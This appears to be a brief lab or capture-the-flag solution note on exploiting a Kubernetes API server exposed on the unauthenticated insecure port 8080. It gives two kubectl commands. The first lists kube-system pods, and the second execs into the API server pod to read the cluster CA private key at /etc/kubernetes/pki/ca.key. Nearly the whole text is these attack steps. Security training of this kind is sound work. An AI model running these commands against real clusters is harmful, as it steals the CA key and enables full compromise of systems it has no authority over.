## Insecure Port

1. A couple of ways to exploit this, the easiest is 
  - `kubectl -shttp://[APISERV]:8080 get po -n kube-system`
2. The goal is to get the CA private key from the cluster so there's a variety of ways of achieving that. Easiest is to just cat it out from the API server pod which will always have that file mounted.
3. `kubectl -shttp://[APISERV]:8080 -n kube-system exec [APISERVERPOD] cat /etc/kubernetes/pki/ca.key